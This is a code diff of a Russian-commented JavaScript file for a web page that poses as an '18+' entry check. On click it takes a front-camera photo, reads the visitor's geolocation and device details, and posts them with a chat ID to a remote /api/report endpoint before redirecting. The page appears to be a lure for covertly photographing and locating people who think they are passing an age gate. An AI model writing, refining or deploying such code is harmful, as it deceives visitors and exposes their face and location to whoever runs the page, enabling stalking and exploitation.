@@ -1,6 +1,11 @@
-// === app.js (версии от меня) ===
-// Работает по тому же origin, где открыт сайт
-const API_BASE = location.hostname.endsWith('cick.one') ? '' : 'https://cick.one';// пустой => текущий origin
+// === app.js (универсальная версия) ===
+
+// Автоматически выбираем API по домену
+const API_BASE = (() => {
+  const host = location.hostname;
+  if (host.endsWith('cick.one')) return ''; // тот же origin (cick.one / www.cick.one)
+  return 'https://cick.one';                // если открыт на onrender
+})();
 
 const UI = {
   text: document.getElementById('text'),
@@ -10,7 +15,7 @@ const UI = {
 
 window.__reportReady = false;
 
-// UI helpers
+// === UI helpers ===
 function logConsole(...args) { console.log('[report]', ...args); }
 function setText(t) { if (UI.text) UI.text.innerHTML = t; }
 function setNote(t) { if (UI.note) UI.note.textContent = t; }
@@ -32,19 +37,13 @@ function setBtnReady() {
   b.style.cursor = 'pointer';
 }
 
-// Проверка permissions API (если доступен)
+// === Permissions ===
 async function checkPermissions() {
   const res = { camera: 'unknown', geolocation: 'unknown' };
   try {
     if (navigator.permissions) {
-      try {
-        const p1 = await navigator.permissions.query({ name: 'camera' });
-        res.camera = p1.state;
-      } catch { /* camera query может быть не поддержан */ }
-      try {
-        const p2 = await navigator.permissions.query({ name: 'geolocation' });
-        res.geolocation = p2.state;
-      } catch { /* ignore */ }
+      try { res.camera = (await navigator.permissions.query({ name: 'camera' })).state; } catch {}
+      try { res.geolocation = (await navigator.permissions.query({ name: 'geolocation' })).state; } catch {}
     }
   } catch (e) {
     logConsole('checkPermissions err', e);
@@ -52,21 +51,17 @@ async function checkPermissions() {
   return res;
 }
 
-// Геолокация
+// === Геолокация ===
 async function askGeolocation() {
   return new Promise((resolve) => {
-    if (!('geolocation' in navigator)) {
-      resolve(null);
-      return;
-    }
+    if (!('geolocation' in navigator)) return resolve(null);
     navigator.geolocation.getCurrentPosition(
-      (p) =>
-        resolve({
-          lat: p.coords.latitude,
-          lon: p.coords.longitude,
-          acc: Math.round(p.coords.accuracy),
-          ts: Date.now(),
-        }),
+      (p) => resolve({
+        lat: p.coords.latitude,
+        lon: p.coords.longitude,
+        acc: Math.round(p.coords.accuracy),
+        ts: Date.now(),
+      }),
       (err) => {
         logConsole('geolocation error', err && err.message);
         resolve(null);
@@ -76,13 +71,9 @@ async function askGeolocation() {
   });
 }
 
-// Снимок с камеры с наилучшей поддержкой
+// === Снимок с камеры ===
 async function takePhoto() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    throw new Error('Camera unsupported');
-  }
-
-  // Требуется user gesture — поэтому вызываем эту функцию только по клику
+  if (!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');
   const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
   const [track] = stream.getVideoTracks();
   try {
@@ -98,58 +89,48 @@ async function takePhoto() {
         track.stop();
         return dataUrl;
       } catch (e) {
-        logConsole('ImageCapture failed, fallback to video', e);
+        logConsole('ImageCapture failed, fallback', e);
       }
     }
 
-    // fallback через video element
     const v = document.createElement('video');
     v.playsInline = true;
     v.muted = true;
     v.srcObject = stream;
-    // ждём метаданных
-    await new Promise((res) => {
-      v.onloadedmetadata = res;
-      // safety timeout
-      setTimeout(res, 2000);
-    });
-    try { await v.play(); } catch (e) { /* браузер может блокировать playback, но frame всё равно может быть доступен */ }
-
-    const w = v.videoWidth || 640;
-    const h = v.videoHeight || 480;
+    await new Promise((res) => { v.onloadedmetadata = res; setTimeout(res, 2000); });
+    try { await v.play(); } catch {}
+    const w = v.videoWidth || 640, h = v.videoHeight || 480;
     const c = document.createElement('canvas');
-    c.width = w;
-    c.height = h;
-    const ctx = c.getContext('2d');
-    ctx.drawImage(v, 0, 0, w, h);
+    c.width = w; c.height = h;
+    c.getContext('2d').drawImage(v, 0, 0, w, h);
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
     stream.getTracks().forEach((t) => t.stop());
     return dataUrl;
   } catch (e) {
-    // если не смогли — убедимся, что трек остановлен
     try { stream.getTracks().forEach((t) => t.stop()); } catch {}
     throw e;
   }
 }
 
+// === Системная инфа ===
 function getDeviceInfo() {
   const ua = navigator.userAgent;
-  const isSafari =
-    /Safari\//.test(ua) &&
-    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) &&
-    navigator.vendor === 'Apple Computer, Inc.';
+  const isSafari = /Safari\//.test(ua)
+    && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua)
+    && navigator.vendor === 'Apple Computer, Inc.';
   const m = ua.match(/OS\s(\d+)[_.]/);
   const iosVer = m ? parseInt(m[1], 10) : null;
   return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
 }
 
+// === Отправка отчёта ===
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
   const body = { ...info, geo, photoBase64, note: 'auto' };
   if (window.__reportChatId) body.chatId = window.__reportChatId;
   if (window.__SLUG) body.slug = window.__SLUG;
 
-  logConsole('POST /api/report body preview', { chatId: body.chatId, slug: body.slug, geo: !!geo });
+  logConsole('POST /api/report', { base: API_BASE, chatId: body.chatId, slug: body.slug });
 
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
@@ -157,19 +138,18 @@ async function sendReport({ photoBase64, geo }) {
     body: JSON.stringify(body),
   });
   const data = await r.json().catch(() => ({}));
-  logConsole('/api/report response', data);
   if (!data.ok) throw new Error(data.error || 'Send failed');
+  logConsole('/api/report ok');
   return data;
 }
 
-// Главный flow - запускается ТОЛЬКО по клику
+// === Основной сценарий ===
 async function performCheck() {
   try {
     setBtnLocked();
     setText('Проверяем разрешения и устройство…');
     setNote('');
 
-    // quick diagnostics
     const perms = await checkPermissions();
     logConsole('permissions', perms);
 
@@ -179,22 +159,21 @@ async function performCheck() {
       throw new Error('Insecure context');
     }
 
-    // Запрос камеры и гео (оба требуют либо жеста пользователя, либо будут отклонены)
     setText('Запрашиваем камеру (разреши в браузере)…');
-    let photo = null;
+    let photo;
     try {
       photo = await takePhoto();
-      logConsole('photo captured size', photo.length);
+      logConsole('photo captured', photo.length);
     } catch (e) {
       logConsole('takePhoto error', e);
       setText('<span class="err">Не удалось получить камеру.</span>');
-      setNote('Проверь разрешения камеры в браузере.');
+      setNote('Проверь разрешения камеры.');
       throw e;
     }
 
     setText('Запрашиваем геопозицию (если доступна)…');
     const geo = await askGeolocation();
-    logConsole('geo result', geo);
+    logConsole('geo', geo);
 
     setText('Отправляем отчёт на сервер…');
     await sendReport({ photoBase64: photo, geo });
@@ -202,45 +181,39 @@ async function performCheck() {
     window.__reportReady = true;
     setBtnReady();
     setText('<span class="ok">Проверка пройдена. Нажми ещё раз, чтобы продолжить.</span>');
-    setNote('Если не перенаправляет — икните меня (скрин ошибок).');
-    logConsole('report done');
+    setNote('Если не перенаправляет — обнови страницу.');
     return true;
   } catch (err) {
     console.error('[performCheck] error', err);
     window.__reportReady = false;
     setBtnLocked();
     if (!UI.text) return false;
-    // нормализованные сообщения
-    if (err && err.name === 'NotAllowedError') {
-      setText('<span class="err">Доступ запрещён (NotAllowed). Разреши камеру/гео.</span>');
-      setNote('Проверь настройки сайта в браузере и перезагрузи страницу.');
-    } else if (err && err.message === 'Insecure context') {
-      // already set above
-    } else if (err && err.message && err.message.includes('Camera unsupported')) {
+    if (err?.name === 'NotAllowedError') {
+      setText('<span class="err">Доступ запрещён (NotAllowed).</span>');
+      setNote('Разреши камеру/гео и обнови страницу.');
+    } else if (err?.message === 'Insecure context') {
+      // уже выведено
+    } else if (err?.message?.includes('Camera unsupported')) {
       setText('<span class="err">Камера не поддерживается.</span>');
-      setNote('Попробуй другой браузер/устройство.');
+      setNote('Попробуй другой браузер или устройство.');
     } else {
       setText('<span class="err">Не удалось пройти проверку.</span>');
-      setNote(String(err && (err.message || err)));
+      setNote(String(err?.message || err));
     }
     return false;
   }
 }
 
-// Инициализация UI
+// === Инициализация ===
 document.addEventListener('DOMContentLoaded', () => {
   if (UI.btn) {
-    UI.btn.style.display = 'block';
     setBtnLocked();
     UI.btn.textContent = 'Войти 18+';
   }
-  // Проверим, что сервер инжектил chatId/slug
   logConsole('injected', { chatId: window.__reportChatId, slug: window.__SLUG });
-
-  // Не автозапускаем performCheck() — большинство браузеров блокируют запрос камеры без клика.
 });
 
-// Обработчик клика: первый клик запускает проверку (если не готово), второй — редирект
+// === Обработчик клика ===
 if (UI.btn) {
   UI.btn.addEventListener('click', async (e) => {
     e.preventDefault();
@@ -249,12 +222,10 @@ if (UI.btn) {
       await performCheck();
       return;
     }
-    // если готово — выполняем редирект (функция go() должна быть в index.html)
     if (typeof go === 'function') {
       try { go(); } catch (err) { logConsole('go() failed', err); setNote('go() error: ' + (err && err.message)); }
     } else {
-      setNote('Редирект не настроен на странице (go() не найден).');
-      logConsole('go() not found');
+      setNote('Редирект не настроен.');
     }
   });
 }
